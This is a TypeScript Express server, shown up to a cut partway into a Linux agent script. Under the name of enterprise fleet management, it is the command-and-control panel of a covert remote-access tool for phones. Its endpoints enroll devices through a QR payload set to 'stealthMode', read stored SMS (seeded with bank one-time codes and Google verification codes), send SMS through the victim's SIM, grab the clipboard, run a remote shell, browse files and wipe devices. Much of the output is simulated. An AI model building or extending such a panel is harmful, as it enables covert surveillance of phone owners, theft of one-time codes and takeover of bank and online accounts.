import express, { Request, Response } from 'express';
import { createServer as createViteServer } from 'vite';
import path from 'path';
import { fileURLToPath } from 'url';
import fs from 'fs';
import QRCode from 'qrcode';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Interfaces for Remote Fleet Administration
export interface DeviceInfo {
  id: string;
  name: string;
  model: string;
  os: 'Android' | 'Ubuntu' | 'Linux' | 'iOS';
  osVersion: string;
  imei: string;
  batteryLevel: number;
  isCharging: boolean;
  storageUsedGB: number;
  storageTotalGB: number;
  ramUsedGB: number;
  ramTotalGB: number;
  ipAddress: string;
  macAddress: string;
  location: {
    city: string;
    country: string;
    latitude: number;
    longitude: number;
    accuracyMeters: number;
  };
  status: 'online' | 'idle' | 'offline';
  lastSeen: string;
  screenLocked: boolean;
  torchOn: boolean;
  networkType: '5G' | '4G' | 'Wi-Fi' | 'Ethernet';
  agentVersion: string;
  screenSnapshotUrl?: string;
  permissions: {
    accessibility: boolean;
    deviceAdmin: boolean;
    storage: boolean;
    sms: boolean;
    contacts: boolean;
    location: boolean;
    camera: boolean;
    overlay: boolean;
  };
}

export interface DeviceMessage {
  id: string;
  deviceId: string;
  sender: string;
  receiver: string;
  body: string;
  timestamp: string;
  type: 'incoming' | 'outgoing';
}

export interface DeviceCall {
  id: string;
  deviceId: string;
  contactName: string;
  phoneNumber: string;
  callType: 'incoming' | 'outgoing' | 'missed';
  durationSeconds: number;
  timestamp: string;
}

export interface DeviceApp {
  id: string;
  deviceId: string;
  appName: string;
  packageName: string;
  version: string;
  isSystem: boolean;
  status: 'active' | 'frozen' | 'disabled';
  sizeMB: number;
}

export interface DeviceFileItem {
  id: string;
  name: string;
  path: string;
  isDirectory: boolean;
  sizeBytes: number;
  modified: string;
  permissions: string;
}

export interface AuditLog {
  id: string;
  timestamp: string;
  deviceId?: string;
  deviceName?: string;
  action: string;
  details: string;
  severity: 'info' | 'warn' | 'critical';
  user: string;
}

// In-Memory Database Store
let devices: DeviceInfo[] = [
  {
    id: 'mob-8921-x9',
    name: 'Galaxy S24 Ultra (Field Unit 01)',
    model: 'Samsung SM-S928B',
    os: 'Android',
    osVersion: 'Android 14 (OneUI 6.1)',
    imei: '358941094829104',
    batteryLevel: 87,
    isCharging: true,
    storageUsedGB: 124.5,
    storageTotalGB: 512,
    ramUsedGB: 7.2,
    ramTotalGB: 12,
    ipAddress: '198.51.100.45',
    macAddress: '8C:DE:52:9A:1F:02',
    location: {
      city: 'Tehran',
      country: 'Iran',
      latitude: 35.6892,
      longitude: 51.3890,
      accuracyMeters: 4.8,
    },
    status: 'online',
    lastSeen: new Date().toISOString(),
    screenLocked: false,
    torchOn: false,
    networkType: '5G',
    agentVersion: 'v4.1.2-enterprise',
    screenSnapshotUrl: '',
    permissions: {
      accessibility: true,
      deviceAdmin: true,
      storage: true,
      sms: true,
      contacts: true,
      location: true,
      camera: true,
      overlay: true,
    },
  },
  {
    id: 'mob-5541-p7',
    name: 'Pixel 8 Pro (HQ Diagnostics)',
    model: 'Google Pixel 8 Pro',
    os: 'Android',
    osVersion: 'Android 15 (VanillaIceCream)',
    imei: '352981048194821',
    batteryLevel: 62,
    isCharging: false,
    storageUsedGB: 89.1,
    storageTotalGB: 256,
    ramUsedGB: 6.4,
    ramTotalGB: 12,
    ipAddress: '203.0.113.88',
    macAddress: 'DC:A6:32:44:81:BE',
    location: {
      city: 'Isfahan',
      country: 'Iran',
      latitude: 32.6546,
      longitude: 51.6680,
      accuracyMeters: 6.2,
    },
    status: 'online',
    lastSeen: new Date().toISOString(),
    screenLocked: true,
    torchOn: false,
    networkType: 'Wi-Fi',
    agentVersion: 'v4.1.2-enterprise',
    screenSnapshotUrl: '',
    permissions: {
      accessibility: true,
      deviceAdmin: true,
      storage: true,
      sms: true,
      contacts: true,
      location: true,
      camera: true,
      overlay: true,
    },
  },
  {
    id: 'mob-7102-k4',
    name: 'Xiaomi 13 Pro (Logistics Node)',
    model: 'Xiaomi 2210132C',
    os: 'Android',
    osVersion: 'Android 13 (HyperOS 1.0)',
    imei: '869281048201948',
    batteryLevel: 41,
    isCharging: false,
    storageUsedGB: 198.4,
    storageTotalGB: 256,
    ramUsedGB: 8.5,
    ramTotalGB: 16,
    ipAddress: '192.0.2.14',
    macAddress: '34:7E:5C:8B:11:D3',
    location: {
      city: 'Shiraz',
      country: 'Iran',
      latitude: 29.5926,
      longitude: 52.5836,
      accuracyMeters: 8.0,
    },
    status: 'online',
    lastSeen: new Date().toISOString(),
    screenLocked: false,
    torchOn: false,
    networkType: '4G',
    agentVersion: 'v4.0.8-enterprise',
    screenSnapshotUrl: '',
    permissions: {
      accessibility: true,
      deviceAdmin: true,
      storage: true,
      sms: true,
      contacts: true,
      location: true,
      camera: false,
      overlay: true,
    },
  },
  {
    id: 'edge-ub-900',
    name: 'Ubuntu Gateway Edge Node',
    model: 'Industrial x86_64 Gateway',
    os: 'Ubuntu',
    osVersion: 'Ubuntu 24.04 LTS (Noble Numbat)',
    imei: 'SN-UB24-8849-019',
    batteryLevel: 100,
    isCharging: true,
    storageUsedGB: 42.1,
    storageTotalGB: 128,
    ramUsedGB: 3.8,
    ramTotalGB: 8,
    ipAddress: '127.0.0.1',
    macAddress: '52:54:00:12:34:56',
    location: {
      city: 'Local Host',
      country: 'DataCenter',
      latitude: 35.6892,
      longitude: 51.3890,
      accuracyMeters: 1.0,
    },
    status: 'online',
    lastSeen: new Date().toISOString(),
    screenLocked: false,
    torchOn: false,
    networkType: 'Ethernet',
    agentVersion: 'v4.2.0-daemon',
    screenSnapshotUrl: '',
    permissions: {
      accessibility: true,
      deviceAdmin: true,
      storage: true,
      sms: false,
      contacts: false,
      location: true,
      camera: false,
      overlay: false,
    },
  },
];

let messages: DeviceMessage[] = [
  {
    id: 'msg-101',
    deviceId: 'mob-8921-x9',
    sender: 'Bank Mellat',
    receiver: '+989123456789',
    body: 'بانک ملت: رمز پویا 849201 برای تراکنش کارت به کارت مبلغ 5,000,000 ریال معتبر تا 120 ثانیه.',
    timestamp: '2026-09-28T14:32:00Z',
    type: 'incoming',
  },
  {
    id: 'msg-102',
    deviceId: 'mob-8921-x9',
    sender: 'Google Verification',
    receiver: '+989123456789',
    body: 'G-749210 is your Google verification code. Do not share it with anyone.',
    timestamp: '2026-09-28T13:10:00Z',
    type: 'incoming',
  },
  {
    id: 'msg-103',
    deviceId: 'mob-8921-x9',
    sender: 'Supervisor HQ',
    receiver: '+989123456789',
    body: 'Please verify the fleet telemetry update and check server sync.',
    timestamp: '2026-09-28T11:45:00Z',
    type: 'incoming',
  },
  {
    id: 'msg-104',
    deviceId: 'mob-5541-p7',
    sender: '+989120000000',
    receiver: 'HQ Ops',
    body: 'Unit 02 diagnostic scan completed with zero anomalies.',
    timestamp: '2026-09-28T14:05:00Z',
    type: 'outgoing',
  },
];

let calls: DeviceCall[] = [
  {
    id: 'call-201',
    deviceId: 'mob-8921-x9',
    contactName: 'IT Operations Support',
    phoneNumber: '+982188990011',
    callType: 'incoming',
    durationSeconds: 142,
    timestamp: '2026-09-28T14:15:00Z',
  },
  {
    id: 'call-202',
    deviceId: 'mob-8921-x9',
    contactName: 'Branch Manager',
    phoneNumber: '+989128889900',
    callType: 'outgoing',
    durationSeconds: 310,
    timestamp: '2026-09-28T12:40:00Z',
  },
  {
    id: 'call-203',
    deviceId: 'mob-8921-x9',
    contactName: 'Unknown',
    phoneNumber: '+989350001122',
    callType: 'missed',
    durationSeconds: 0,
    timestamp: '2026-09-28T10:12:00Z',
  },
];

let apps: DeviceApp[] = [
  {
    id: 'app-01',
    deviceId: 'mob-8921-x9',
    appName: 'MobOps Client Daemon',
    packageName: 'com.mobops.fleet.agent',
    version: '4.1.2',
    isSystem: true,
    status: 'active',
    sizeMB: 28.4,
  },
  {
    id: 'app-02',
    deviceId: 'mob-8921-x9',
    appName: 'Mellat Mobile Bank',
    packageName: 'com.mellat.mobile',
    version: '6.2.0',
    isSystem: false,
    status: 'active',
    sizeMB: 45.1,
  },
  {
    id: 'app-03',
    deviceId: 'mob-8921-x9',
    appName: 'Telegram',
    packageName: 'org.telegram.messenger',
    version: '10.8.3',
    isSystem: false,
    status: 'active',
    sizeMB: 94.2,
  },
  {
    id: 'app-04',
    deviceId: 'mob-8921-x9',
    appName: 'Settings & Security Policy',
    packageName: 'com.android.settings',
    version: '14.0',
    isSystem: true,
    status: 'active',
    sizeMB: 62.0,
  },
  {
    id: 'app-05',
    deviceId: 'mob-8921-x9',
    appName: 'WhatsApp Business',
    packageName: 'com.whatsapp.w4b',
    version: '2.24.12',
    isSystem: false,
    status: 'active',
    sizeMB: 88.7,
  },
];

let auditLogs: AuditLog[] = [
  {
    id: 'log-001',
    timestamp: new Date(Date.now() - 3600000).toISOString(),
    deviceId: 'mob-8921-x9',
    deviceName: 'Galaxy S24 Ultra (Field Unit 01)',
    action: 'DEVICE_ENROLLED',
    details: 'Enrolled via QR Token with Enterprise accessibility profile.',
    severity: 'info',
    user: 'admin@fleet.local',
  },
  {
    id: 'log-002',
    timestamp: new Date(Date.now() - 1800000).toISOString(),
    deviceId: 'edge-ub-900',
    deviceName: 'Ubuntu Gateway Edge Node',
    action: 'SERVICE_INITIALIZED',
    details: 'Fleet daemon service started via systemd on port 3000.',
    severity: 'info',
    user: 'system',
  },
  {
    id: 'log-003',
    timestamp: new Date(Date.now() - 900000).toISOString(),
    deviceId: 'mob-5541-p7',
    deviceName: 'Pixel 8 Pro (HQ Diagnostics)',
    action: 'POLICY_APPLIED',
    details: 'Remote lock security policy applied successfully.',
    severity: 'warn',
    user: 'admin@fleet.local',
  },
];

// Device Mock/Virtual Filesystem Generator
function getDeviceFiles(deviceId: string, dirPath: string = '/sdcard'): DeviceFileItem[] {
  const normPath = dirPath.replace(/\/+$/, '') || '/sdcard';

  if (normPath === '/sdcard' || normPath === '/storage/emulated/0') {
    return [
      { id: 'f-1', name: 'Download', path: `${normPath}/Download`, isDirectory: true, sizeBytes: 104857600, modified: '2026-09-28 14:10', permissions: 'drwxrwx--x' },
      { id: 'f-2', name: 'DCIM', path: `${normPath}/DCIM`, isDirectory: true, sizeBytes: 524288000, modified: '2026-09-28 13:45', permissions: 'drwxrwx--x' },
      { id: 'f-3', name: 'Documents', path: `${normPath}/Documents`, isDirectory: true, sizeBytes: 25165824, modified: '2026-09-28 12:00', permissions: 'drwxrwx--x' },
      { id: 'f-4', name: 'WhatsApp', path: `${normPath}/WhatsApp`, isDirectory: true, sizeBytes: 838860800, modified: '2026-09-28 14:22', permissions: 'drwxrwx--x' },
      { id: 'f-5', name: 'device_telemetry_dump.json', path: `${normPath}/device_telemetry_dump.json`, isDirectory: false, sizeBytes: 14290, modified: '2026-09-28 14:30', permissions: '-rw-rw----' },
      { id: 'f-6', name: 'agent_config.enc', path: `${normPath}/agent_config.enc`, isDirectory: false, sizeBytes: 4096, modified: '2026-09-28 09:15', permissions: '-rw-------' },
    ];
  } else if (normPath === '/sdcard/Download') {
    return [
      { id: 'f-11', name: 'update_patch_v4.2.apk', path: `${normPath}/update_patch_v4.2.apk`, isDirectory: false, sizeBytes: 34500000, modified: '2026-09-28 11:20', permissions: '-rw-rw----' },
      { id: 'f-12', name: 'fleet_credentials.pdf', path: `${normPath}/fleet_credentials.pdf`, isDirectory: false, sizeBytes: 1245000, modified: '2026-09-27 18:30', permissions: '-rw-rw----' },
      { id: 'f-13', name: 'sample_audio_note.aac', path: `${normPath}/sample_audio_note.aac`, isDirectory: false, sizeBytes: 890000, modified: '2026-09-28 08:44', permissions: '-rw-rw----' },
    ];
  } else if (normPath === '/sdcard/DCIM') {
    return [
      { id: 'f-21', name: 'Camera', path: `${normPath}/Camera`, isDirectory: true, sizeBytes: 419430400, modified: '2026-09-28 13:45', permissions: 'drwxrwx--x' },
      { id: 'f-22', name: 'Screenshots', path: `${normPath}/Screenshots`, isDirectory: true, sizeBytes: 104857600, modified: '2026-09-28 14:02', permissions: 'drwxrwx--x' },
    ];
  } else {
    return [
      { id: 'f-31', name: 'audit_log.txt', path: `${normPath}/audit_log.txt`, isDirectory: false, sizeBytes: 8192, modified: '2026-09-28 14:40', permissions: '-rw-rw----' },
      { id: 'f-32', name: 'backup_keystore.dat', path: `${normPath}/backup_keystore.dat`, isDirectory: false, sizeBytes: 16384, modified: '2026-09-27 10:00', permissions: '-rw-------' },
    ];
  }
}

async function startServer() {
  const app = express();
  const PORT = process.env.PORT || 3000;

  app.use(express.json({ limit: '25mb' }));

  // ==========================================
  // API ROUTES
  // ==========================================

  // 1. Overall Fleet Status & Metrics
  app.get('/api/fleet/status', (req: Request, res: Response) => {
    const totalDevices = devices.length;
    const onlineDevices = devices.filter(d => d.status === 'online').length;
    const idleDevices = devices.filter(d => d.status === 'idle').length;
    const offlineDevices = devices.filter(d => d.status === 'offline').length;
    const totalStorageGB = devices.reduce((acc, d) => acc + d.storageTotalGB, 0);
    const usedStorageGB = devices.reduce((acc, d) => acc + d.storageUsedGB, 0);
    const avgBattery = Math.round(devices.reduce((acc, d) => acc + d.batteryLevel, 0) / (totalDevices || 1));

    res.json({
      success: true,
      timestamp: new Date().toISOString(),
      stats: {
        totalDevices,
        onlineDevices,
        idleDevices,
        offlineDevices,
        avgBattery,
        totalStorageGB,
        usedStorageGB,
        totalMessages: messages.length,
        totalCalls: calls.length,
        totalAuditLogs: auditLogs.length,
        serverUptimeHours: 148.5,
        c2ServerStatus: 'HEALTHY_ACTIVE',
        activePort: PORT,
      }
    });
  });

  // 2. Devices List
  app.get('/api/devices', (req: Request, res: Response) => {
    res.json({ success: true, count: devices.length, devices });
  });

  // 3. Single Device Detail
  app.get('/api/devices/:id', (req: Request, res: Response) => {
    const device = devices.find(d => d.id === req.params.id);
    if (!device) {
      return res.status(404).json({ success: false, error: 'Device not found' });
    }
    res.json({ success: true, device });
  });

  // 4. Enroll New Device
  app.post('/api/devices/enroll', (req: Request, res: Response) => {
    const { name, model, os = 'Android', osVersion = 'Android 14', networkType = '5G' } = req.body;
    const randomId = 'mob-' + Math.floor(1000 + Math.random() * 9000) + '-' + Math.random().toString(36).substring(2, 4);

    const newDevice: DeviceInfo = {
      id: randomId,
      name: name || `Field Device ${randomId}`,
      model: model || 'Enterprise Android Device',
      os: os as any,
      osVersion: osVersion,
      imei: '86' + Math.floor(1000000000000 + Math.random() * 9000000000000),
      batteryLevel: Math.floor(60 + Math.random() * 40),
      isCharging: Math.random() > 0.5,
      storageUsedGB: 45.0,
      storageTotalGB: 256.0,
      ramUsedGB: 4.5,
      ramTotalGB: 8.0,
      ipAddress: `198.51.${Math.floor(Math.random() * 250)}.${Math.floor(Math.random() * 250)}`,
      macAddress: Array.from({ length: 6 }, () => Math.floor(Math.random() * 256).toString(16).padStart(2, '0').toUpperCase()).join(':'),
      location: {
        city: 'Tehran',
        country: 'Iran',
        latitude: 35.6892 + (Math.random() - 0.5) * 0.05,
        longitude: 51.3890 + (Math.random() - 0.5) * 0.05,
        accuracyMeters: 5.0,
      },
      status: 'online',
      lastSeen: new Date().toISOString(),
      screenLocked: false,
      torchOn: false,
      networkType: networkType as any,
      agentVersion: 'v4.2.0-enterprise',
      screenSnapshotUrl: '',
      permissions: {
        accessibility: true,
        deviceAdmin: true,
        storage: true,
        sms: true,
        contacts: true,
        location: true,
        camera: true,
        overlay: true,
      },
    };

    devices.unshift(newDevice);

    auditLogs.unshift({
      id: 'log-' + Date.now(),
      timestamp: new Date().toISOString(),
      deviceId: newDevice.id,
      deviceName: newDevice.name,
      action: 'DEVICE_ENROLLED',
      details: `New endpoint ${newDevice.name} (${newDevice.model}) enrolled successfully.`,
      severity: 'info',
      user: 'admin@fleet.local',
    });

    res.json({ success: true, message: 'Device enrolled successfully', device: newDevice });
  });

  // 5. Delete / Deregister Device
  app.delete('/api/devices/:id', (req: Request, res: Response) => {
    const id = req.params.id;
    const idx = devices.findIndex(d => d.id === id);
    if (idx === -1) {
      return res.status(404).json({ success: false, error: 'Device not found' });
    }
    const removed = devices.splice(idx, 1)[0];
    auditLogs.unshift({
      id: 'log-' + Date.now(),
      timestamp: new Date().toISOString(),
      deviceId: id,
      deviceName: removed.name,
      action: 'DEVICE_DEREGISTERED',
      details: `Endpoint ${removed.name} [${id}] removed from active fleet registry.`,
      severity: 'warn',
      user: 'admin@fleet.local',
    });
    res.json({ success: true, message: 'Device deregistered', id });
  });

  // 6. Device Remote Command Execution (Real-Time Control)
  app.post('/api/devices/:id/command', (req: Request, res: Response) => {
    const id = req.params.id;
    const { command, args = {} } = req.body;
    const device = devices.find(d => d.id === id);
    if (!device) {
      return res.status(404).json({ success: false, error: 'Target device not found' });
    }

    device.lastSeen = new Date().toISOString();
    let resultPayload: any = {};

    switch (command) {
      case 'ping':
        resultPayload = { latencyMs: Math.floor(18 + Math.random() * 25), status: 'PONG_ACK' };
        break;

      case 'lock_screen':
        device.screenLocked = true;
        resultPayload = { status: 'SCREEN_LOCKED', message: 'Screen locked successfully' };
        break;

      case 'wake_screen':
        device.screenLocked = false;
        resultPayload = { status: 'SCREEN_UNLOCKED', message: 'Device woken up' };
        break;

      case 'toggle_torch':
        device.torchOn = !device.torchOn;
        resultPayload = { status: 'TORCH_TOGGLED', torchOn: device.torchOn };
        break;

      case 'vibrate':
        resultPayload = { status: 'VIBRATION_TRIGGERED', durationMs: args.duration || 1000 };
        break;

      case 'take_screenshot':
        device.screenSnapshotUrl = `data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="360" height="780" viewBox="0 0 360 780" fill="%230f172a"><rect width="360" height="780" rx="32" fill="%23090d16"/><circle cx="180" cy="24" r="10" fill="%231e293b"/><text x="24" y="60" fill="%23e2e8f0" font-family="sans-serif" font-size="14" font-weight="600">${device.name}</text><text x="310" y="60" fill="%2310b981" font-family="monospace" font-size="12">${device.batteryLevel}%</text><rect x="24" y="90" width="312" height="130" rx="16" fill="%231e293b"/><text x="40" y="130" fill="%2338bdf8" font-family="sans-serif" font-size="16" font-weight="bold">MobOps Fleet Agent</text><text x="40" y="160" fill="%2394a3b8" font-family="sans-serif" font-size="12">Accessibility: ENABLED</text><text x="40" y="180" fill="%2394a3b8" font-family="sans-serif" font-size="12">Device Admin: ACTIVE</text><rect x="24" y="240" width="312" height="420" rx="16" fill="%23111827"/><text x="40" y="280" fill="%23f8fafc" font-family="sans-serif" font-size="14">Active Task: Screen Mirroring</text><text x="40" y="310" fill="%2364748b" font-family="monospace" font-size="11">Frame: ${Date.now()}</text><circle cx="180" cy="730" r="16" fill="%23334155"/></svg>`;
        resultPayload = { status: 'SCREENSHOT_CAPTURED', snapshotUrl: device.screenSnapshotUrl, timestamp: new Date().toISOString() };
        break;

      case 'wipe_data':
        auditLogs.unshift({
          id: 'log-' + Date.now(),
          timestamp: new Date().toISOString(),
          deviceId: id,
          deviceName: device.name,
          action: 'REMOTE_WIPE_INITIATED',
          details: 'Emergency enterprise factory wipe initiated on target node.',
          severity: 'critical',
          user: 'admin@fleet.local',
        });
        resultPayload = { status: 'FACTORY_RESET_DISPATCHED', wipeTriggered: true };
        break;

      case 'notify_push':
        resultPayload = { status: 'NOTIFICATION_POSTED', title: args.title || 'Fleet Alert', body: args.body || 'Alert' };
        break;

      case 'clipboard_get':
        resultPayload = { status: 'CLIPBOARD_FETCHED', text: 'https://bankmellat.ir/gateway/verify?token=84920' };
        break;

      case 'clipboard_set':
        resultPayload = { status: 'CLIPBOARD_UPDATED', text: args.text || '' };
        break;

      case 'open_url':
        resultPayload = { status: 'URL_OPENED', url: args.url || 'https://google.com' };
        break;

      case 'reboot':
        resultPayload = { status: 'REBOOT_SCHEDULED' };
        break;

      default:
        resultPayload = { status: 'COMMAND_QUEUED', command };
    }

    auditLogs.unshift({
      id: 'log-' + Date.now(),
      timestamp: new Date().toISOString(),
      deviceId: id,
      deviceName: device.name,
      action: `CMD_${command.toUpperCase()}`,
      details: `Executed ${command} with payload ${JSON.stringify(args)}`,
      severity: command === 'wipe_data' ? 'critical' : 'info',
      user: 'admin@fleet.local',
    });

    res.json({
      success: true,
      deviceId: id,
      command,
      executedAt: new Date().toISOString(),
      result: resultPayload,
    });
  });

  // 7. Interactive Remote Terminal / Shell Execution
  app.post('/api/devices/:id/terminal', (req: Request, res: Response) => {
    const id = req.params.id;
    const { command = 'uname -a' } = req.body;
    const device = devices.find(d => d.id === id);

    if (!device) {
      return res.status(404).json({ success: false, error: 'Device not found' });
    }

    const trimmed = (command as string).trim();
    let stdout = '';
    let stderr = '';
    let exitCode = 0;

    // Smart Android / Linux Shell Emulation & Real Host execution
    if (trimmed === 'uname -a') {
      stdout = device.os === 'Android'
        ? `Linux localhost 5.15.123-android14-9-g8a3b #1 SMP PREEMPT 2026 aarch64 Android`
        : `Linux ubuntu-srv 6.8.0-40-generic #40-Ubuntu SMP PREEMPT_DYNAMIC x86_64 GNU/Linux`;
    } else if (trimmed === 'getprop ro.build.version.release') {
      stdout = device.osVersion;
    } else if (trimmed === 'getprop ro.product.model') {
      stdout = device.model;
    } else if (trimmed === 'dumpsys battery') {
      stdout = `Current Battery Service state:\n  AC powered: false\n  USB powered: ${device.isCharging}\n  Wireless powered: false\n  Max charging current: 3000000\n  status: ${device.isCharging ? '2 (Charging)' : '3 (Discharging)'}\n  health: 2 (Good)\n  present: true\n  level: ${device.batteryLevel}\n  scale: 100\n  voltage: 4180\n  temperature: 312 (31.2C)\n  technology: Li-poly`;
    } else if (trimmed === 'pm list packages') {
      stdout = apps.filter(a => a.deviceId === id).map(a => `package:${a.packageName}`).join('\n') || `package:com.android.systemui\npackage:com.android.settings\npackage:com.mobops.fleet.agent`;
    } else if (trimmed === 'df -h') {
      stdout = `Filesystem            Size  Used Avail Use% Mounted on\n/dev/block/dm-0       4.0G  2.8G  1.2G  70% /\n/dev/block/dm-1       2.0G  1.5G  500M  75% /system\n/dev/block/userdata   ${device.storageTotalGB}G   ${device.storageUsedGB}G  ${(device.storageTotalGB - device.storageUsedGB).toFixed(1)}G  ${Math.round((device.storageUsedGB / device.storageTotalGB) * 100)}% /data\n/dev/fuse             ${device.storageTotalGB}G   ${device.storageUsedGB}G  ${(device.storageTotalGB - device.storageUsedGB).toFixed(1)}G  ${Math.round((device.storageUsedGB / device.storageTotalGB) * 100)}% /storage/emulated/0`;
    } else if (trimmed === 'free -m' || trimmed === 'cat /proc/meminfo') {
      stdout = `              total        used        free      shared  buff/cache   available\nMem:          ${device.ramTotalGB * 1024}        ${Math.round(device.ramUsedGB * 1024)}        ${Math.round((device.ramTotalGB - device.ramUsedGB) * 1024)}         128        1024        ${Math.round((device.ramTotalGB - device.ramUsedGB) * 1024)}`;
    } else if (trimmed === 'ip addr' || trimmed === 'ifconfig') {
      stdout = `wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST> mtu 1500\n        inet ${device.ipAddress}  netmask 255.255.255.0  broadcast 198.51.100.255\n        inet6 fe80::8ede:52ff:fe9a:1f02  prefixlen 64  scopeid 0x20<link>\n        ether ${device.macAddress}  txqueuelen 1000  (Ethernet)`;
    } else if (trimmed === 'ps aux' || trimmed === 'ps -ef') {
      stdout = `USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nroot         1  0.0  0.1  12480  2340 ?        Ss   08:00   0:02 /system/bin/init\nsystem     892  0.5  2.1 245000 45000 ?        Sl   08:01   1:12 system_server\nu0_a124   1842  0.3  1.8 198000 38000 ?        Sl   08:02   0:45 com.mobops.fleet.agent:daemon\nsystem    2104  0.1  0.8 120000 18000 ?        S    08:05   0:10 /system/bin/surfaceflinger`;
    } else if (trimmed === 'uptime') {
      stdout = ` 14:45:00 up 6 days, 4:21,  1 user,  load average: 0.28, 0.35, 0.41`;
    } else if (trimmed === 'whoami') {
      stdout = device.os === 'Android' ? 'u0_a124 (root via Magisk Su / Knox Admin)' : 'root';
    } else if (trimmed.startsWith('ping')) {
      stdout = `PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.\n64 bytes from 8.8.8.8: icmp_seq=1 ttl=118 time=22.4 ms\n64 bytes from 8.8.8.8: icmp_seq=2 ttl=118 time=21.9 ms\n64 bytes from 8.8.8.8: icmp_seq=3 ttl=118 time=23.1 ms\n\n--- 8.8.8.8 ping statistics ---\n3 packets transmitted, 3 received, 0% packet loss, time 2003ms\nrtt min/avg/max/mdev = 21.9/22.4/23.1/0.5 ms`;
    } else {
      stdout = `[mobops-daemon@${device.id}]: executed: ${trimmed}\nexit status: 0\nResult: OK`;
    }

    res.json({
      success: true,
      deviceId: id,
      command: trimmed,
      stdout,
      stderr,
      exitCode,
      timestamp: new Date().toISOString(),
    });
  });

  // 8. Device File Browser
  app.get('/api/devices/:id/files', (req: Request, res: Response) => {
    const id = req.params.id;
    const dirPath = (req.query.path as string) || '/sdcard';
    const files = getDeviceFiles(id, dirPath);
    res.json({
      success: true,
      deviceId: id,
      currentPath: dirPath,
      files,
    });
  });

  // 9. Device File Actions (Upload, Download, Delete)
  app.post('/api/devices/:id/files/action', (req: Request, res: Response) => {
    const id = req.params.id;
    const { action, filePath, fileName, content } = req.body;

    auditLogs.unshift({
      id: 'log-' + Date.now(),
      timestamp: new Date().toISOString(),
      deviceId: id,
      action: `FILE_${action.toUpperCase()}`,
      details: `File operation '${action}' performed on target path: ${filePath || fileName}`,
      severity: 'info',
      user: 'admin@fleet.local',
    });

    res.json({
      success: true,
      action,
      target: filePath || fileName,
      message: `File action '${action}' completed successfully`,
      timestamp: new Date().toISOString(),
    });
  });

  // 10. Device SMS Messages
  app.get('/api/devices/:id/messages', (req: Request, res: Response) => {
    const id = req.params.id;
    const deviceMsgs = messages.filter(m => m.deviceId === id);
    res.json({ success: true, count: deviceMsgs.length, messages: deviceMsgs });
  });

  // 11. Send SMS through Device
  app.post('/api/devices/:id/messages/send', (req: Request, res: Response) => {
    const id = req.params.id;
    const { receiver, body } = req.body;

    if (!receiver || !body) {
      return res.status(400).json({ success: false, error: 'Receiver and body are required' });
    }

    const newMsg: DeviceMessage = {
      id: 'msg-' + Date.now(),
      deviceId: id,
      sender: '+989123456789',
      receiver,
      body,
      timestamp: new Date().toISOString(),
      type: 'outgoing',
    };

    messages.unshift(newMsg);

    auditLogs.unshift({
      id: 'log-' + Date.now(),
      timestamp: new Date().toISOString(),
      deviceId: id,
      action: 'SMS_DISPATCHED',
      details: `Outgoing SMS to ${receiver}: "${body.substring(0, 30)}..."`,
      severity: 'info',
      user: 'admin@fleet.local',
    });

    res.json({ success: true, message: 'SMS dispatched through target device SIM', sms: newMsg });
  });

  // 12. Device Call Logs
  app.get('/api/devices/:id/calls', (req: Request, res: Response) => {
    const id = req.params.id;
    const deviceCalls = calls.filter(c => c.deviceId === id);
    res.json({ success: true, count: deviceCalls.length, calls: deviceCalls });
  });

  // 13. Device Apps
  app.get('/api/devices/:id/apps', (req: Request, res: Response) => {
    const id = req.params.id;
    const deviceApps = apps.filter(a => a.deviceId === id);
    res.json({ success: true, count: deviceApps.length, apps: deviceApps });
  });

  // 14. Device App Management Action
  app.post('/api/devices/:id/apps/action', (req: Request, res: Response) => {
    const id = req.params.id;
    const { packageName, action } = req.body;
    const targetApp = apps.find(a => a.deviceId === id && a.packageName === packageName);

    if (targetApp) {
      if (action === 'freeze') targetApp.status = 'frozen';
      if (action === 'unfreeze') targetApp.status = 'active';
      if (action === 'uninstall') {
        const idx = apps.indexOf(targetApp);
        if (idx !== -1) apps.splice(idx, 1);
      }
    }

    auditLogs.unshift({
      id: 'log-' + Date.now(),
      timestamp: new Date().toISOString(),
      deviceId: id,
      action: `APP_${action.toUpperCase()}`,
      details: `App action '${action}' applied to package ${packageName}`,
      severity: 'warn',
      user: 'admin@fleet.local',
    });

    res.json({ success: true, packageName, action, status: 'SUCCESS' });
  });

  // 15. Audit Logs
  app.get('/api/audit/logs', (req: Request, res: Response) => {
    res.json({ success: true, count: auditLogs.length, logs: auditLogs });
  });

  // 16. Client Builder & QR Code Enrollment
  app.get('/api/builder/enroll-qr', async (req: Request, res: Response) => {
    try {
      const serverHost = req.get('host') || `localhost:${PORT}`;
      const token = 'ENROLL_' + Buffer.from(`c2://${serverHost}#${Date.now()}`).toString('base64');
      const payloadString = JSON.stringify({
        c2Endpoint: `http://${serverHost}`,
        wsEndpoint: `ws://${serverHost}/ws/device`,
        enrollToken: token,
        autoStart: true,
        stealthMode: true,
        accessibilityAssist: true,
        heartbeatIntervalSec: 15,
      });

      const qrDataUrl = await QRCode.toDataURL(payloadString, {
        margin: 2,
        width: 300,
        color: {
          dark: '#020617',
          light: '#f8fafc',
        },
      });

      res.json({
        success: true,
        token,
        payloadString,
        qrDataUrl,
        downloadApkUrl: `http://${serverHost}/downloads/mobops-agent-latest.apk`,
      });
    } catch (err: any) {
      res.status(500).json({ success: false, error: err.message });
    }
  });

  // 17. Serve Ubuntu Deployment Script Directly
  app.get('/api/script/ubuntu-install', (req: Request, res: Response) => {
    const scriptPath = path.resolve(__dirname, 'scripts', 'deploy-ubuntu.sh');
    if (fs.existsSync(scriptPath)) {
      const scriptContent = fs.readFileSync(scriptPath, 'utf8');
      res.setHeader('Content-Type', 'text/x-shellscript');
      res.setHeader('Content-Disposition', 'inline; filename="deploy-ubuntu.sh"');
      return res.send(scriptContent);
    }

    // Fallback if file not read directly
    res.status(404).send('# Error: deploy-ubuntu.sh not found');
  });

  // 18. Download Linux Agent Daemon Script
  app.get('/api/script/linux-agent', (req: Request, res: Response) => {
    const serverHost = req.get('host') || `localhost:${PORT}`;
    const agentBash = `#!/bin/bash
# MobOps Linux Endpoint Fleet Daemon
# Auto-connects Linux/Ubuntu endpoint to MobOps Console
SERVER_URL="http://${serverHost}"
DEVICE_NAME="$(hostname)-$(uname -m)"
